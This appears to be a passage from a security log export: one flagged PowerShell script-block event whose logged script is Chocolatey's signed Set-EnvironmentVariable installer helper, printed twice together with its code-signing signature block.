Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkq","eddbf1d6-60c9-96f5-4cdf-f0947b3aad8f"
"2019-03-19 14:21:32.692 +01:00","WinAPI Library Calls Via PowerShell Scripts","med","MSEDGEWIN10","PwSh",4104,64,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Set-EnvironmentVariable { <# .SYNOPSIS **NOTE:** Administrative Access Required when `-Scope 'Machine'.` DO NOT USE. Not part of the public API. Use `Install-ChocolateyEnvironmentVariable` instead. .DESCRIPTION Saves an environment variable. .NOTES This command will assert UAC/Admin privileges on the machine if `-Scope 'Machine'`. .INPUTS None .OUTPUTS None .PARAMETER Name .PARAMETER Value .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .LINK Install-ChocolateyEnvironmentVariable .LINK Uninstall-ChocolateyEnvironmentVariable .LINK Install-ChocolateyPath .LINK Get-EnvironmentVariable #> param ( [parameter(Mandatory=$true, Position=0)][string] $Name, [parameter(Mandatory=$false, Position=1)][string] $Value, [parameter(Mandatory=$false, Position=2)] [System.EnvironmentVariableTarget] $Scope, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($Scope -eq [System.EnvironmentVariableTarget]::Process -or $Value -eq $null -or $Value -eq '') { return [Environment]::SetEnvironmentVariable($Name, $Value, $Scope) } [string]$keyHive = 'HKEY_LOCAL_MACHINE' [string]$registryKey = ""SYSTEM\CurrentControlSet\Control\Session Manager\Environment\"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($registryKey) if ($Scope -eq [System.EnvironmentVariableTarget]::User) { $keyHive = 'HKEY_CURRENT_USER' $registryKey = ""Environment"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($registryKey) } [Microsoft.Win32.RegistryValueKind]$registryType = [Microsoft.Win32.RegistryValueKind]::String try { if ($win32RegistryKey.GetValueNames() -contains $Name) { $registryType = $win32RegistryKey.GetValueKind($Name) } } catch { # the value doesn't yet exist # move along, nothing to see here } Write-Debug ""Registry type for $Name is/will be $registryType"" if ($Name -eq 'PATH') { $registryType = [Microsoft.Win32.RegistryValueKind]::ExpandString } [Microsoft.Win32.Registry]::SetValue($keyHive + ""\"" + $registryKey, $Name, $Value, $registryType) try { # make everything refresh # because sometimes explorer.exe just doesn't get the message that things were updated. if (-not (""win32.nativemethods"" -as [type])) { # import sendmessagetimeout from win32 add-type -Namespace Win32 -Name NativeMethods -MemberDefinition @"" [DllImport(""user32.dll"", SetLastError = true, CharSet = CharSet.Auto)] public static extern IntPtr SendMessageTimeout( IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam, uint fuFlags, uint uTimeout, out UIntPtr lpdwResult); ""@ } $HWND_BROADCAST = [intptr]0xffff; $WM_SETTINGCHANGE = 0x1a; $result = [uintptr]::zero # notify all windows of environment block change [win32.nativemethods]::SendMessageTimeout($HWND_BROADCAST, $WM_SETTINGCHANGE, [uintptr]::Zero, ""Environment"", 2, 5000, [ref]$result) | Out-Null # Set a user environment variable making the system refresh $setx = ""$($env:SystemRoot)\System32\setx.exe"" & ""$setx"" ChocolateyLastPathUpdate `""$((Get-Date).ToFileTime())`"" | Out-Null } catch { Write-Warning ""Failure attempting to let Explorer know about updated environment settings.`n $($_.Exception.Message)"" } Update-SessionEnvironment } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBOu3ChoK62lTYZ # 9Y709GEKMD/ZFRQI2jbzh+hJKc5Y1KCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgPp4/Gnz1p2MhBlnpEil0vTWoLvzfKqLrdT9+ # qrHVL8MwDQYJKoZIhvcNAQEBBQAEggEAsmbFS+5MO59WHOwvtI/xhg/fORekpXCn # kDdVLu6caJVUh3BVk17uv3eFpYR/I4MU4W65maxIK7l9jhiGcxvF37E94lSqEtZc # LVN5m7dRjiLSSuv2NenuQLr3kIGhQeB4c/lwiZcRBf53ANdTwUbMwF9UtlARxq3R # Hn1/T4caGriEClaXY55qOw4PAxzJC/zze6SwXGarXTY0YyuOHYNZ+VutwOT3/Ilz # Q7kytjehIqtDUhuBZtgv6qdnwJyNJM40WOyVKyg71OFx8EwwuOJDyvy9poKmykuE # aPxVK+DRWgpSwjDy+PCjbbcNS8eaOiJS3uyswv1l6DqRzZ59H6PyaKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAwWjAjBgkqhkiG9w0BCQQxFgQUjP95hMVfZNWYfVjI # L9Cgest1f1MwDQYJKoZIhvcNAQEBBQAEggEALzknQ55rcp9crkxee1A87etbTGT+ # iJZqbaxZIe+Sj34Ml53OIqvMQj35ygkKq02ONTDQiK5EVlYLm8+1Dn/xPF0nanDt # SaihFMa2VKo3mcwDUy4E6vTUfmFrMpCcYXxmbYghGFQO7e6Izq+6UtQIG19mj8Hn # c+6wbmlKuqaJa2KFx5X2QFOoOP18QUeKxDZelbDClc6TRKIlMRuihofcRCByF2Bj # MNpDySXfRafleMS1EybFmmNVrdnaqx+ncCF1ud/niIEH1rAUb52RyPg+WiqGXtUB # PqBJonzDwmRxEvj/a6qYMM+neDEC+DjnSF0CtNZK1rW6MFDgHS+FFvv/kQ== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateyInstall\helpers\functions\Set-EnvironmentVariable.ps1 ¦ ScriptBlockId: 336e6c64-4186-48c1-bb40-94a124a7ed7e ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Set-EnvironmentVariable { <# .SYNOPSIS **NOTE:** Administrative Access Required when `-Scope 'Machine'.` DO NOT USE. Not part of the public API. Use `Install-ChocolateyEnvironmentVariable` instead. .DESCRIPTION Saves an environment variable. .NOTES This command will assert UAC/Admin privileges on the machine if `-Scope 'Machine'`. .INPUTS None .OUTPUTS None .PARAMETER Name .PARAMETER Value .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .LINK Install-ChocolateyEnvironmentVariable .LINK Uninstall-ChocolateyEnvironmentVariable .LINK Install-ChocolateyPath .LINK Get-EnvironmentVariable #> param ( [parameter(Mandatory=$true, Position=0)][string] $Name, [parameter(Mandatory=$false, Position=1)][string] $Value, [parameter(Mandatory=$false, Position=2)] [System.EnvironmentVariableTarget] $Scope, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($Scope -eq [System.EnvironmentVariableTarget]::Process -or $Value -eq $null -or $Value -eq '') { return [Environment]::SetEnvironmentVariable($Name, $Value, $Scope) } [string]$keyHive = 'HKEY_LOCAL_MACHINE' [string]$registryKey = ""SYSTEM\CurrentControlSet\Control\Session Manager\Environment\"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($registryKey) if ($Scope -eq [System.EnvironmentVariableTarget]::User) { $keyHive = 'HKEY_CURRENT_USER' $registryKey = ""Environment"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($registryKey) } [Microsoft.Win32.RegistryValueKind]$registryType = [Microsoft.Win32.RegistryValueKind]::String try { if ($win32RegistryKey.GetValueNames() -contains $Name) { $registryType = $win32RegistryKey.GetValueKind($Name) } } catch { # the value doesn't yet exist # move along, nothing to see here } Write-Debug ""Registry type for $Name is/will be $registryType"" if ($Name -eq 'PATH') { $registryType = [Microsoft.Win32.RegistryValueKind]::ExpandString } [Microsoft.Win32.Registry]::SetValue($keyHive + ""\"" + $registryKey, $Name, $Value, $registryType) try { # make everything refresh # because sometimes explorer.exe just doesn't get the message that things were updated. if (-not (""win32.nativemethods"" -as [type])) { # import sendmessagetimeout from win32 add-type -Namespace Win32 -Name NativeMethods -MemberDefinition @"" [DllImport(""user32.dll"", SetLastError = true, CharSet = CharSet.Auto)] public static extern IntPtr SendMessageTimeout( IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam, uint fuFlags, uint uTimeout, out UIntPtr lpdwResult); ""@ } $HWND_BROADCAST = [intptr]0xffff; $WM_SETTINGCHANGE = 0x1a; $result = [uintptr]::zero # notify all windows of environment block change [win32.nativemethods]::SendMessageTimeout($HWND_BROADCAST, $WM_SETTINGCHANGE, [uintptr]::Zero, ""Environment"", 2, 5000, [ref]$result) | Out-Null # Set a user environment variable making the system refresh $setx = ""$($env:SystemRoot)\System32\setx.exe"" & ""$setx"" ChocolateyLastPathUpdate `""$((Get-Date).ToFileTime())`"" | Out-Null } catch { Write-Warning ""Failure attempting to let Explorer know about updated environment settings.`n $($_.Exception.Message)"" } Update-SessionEnvironment } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBOu3ChoK62lTYZ # 9Y709GEKMD/ZFRQI2jbzh+hJKc5Y1KCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # 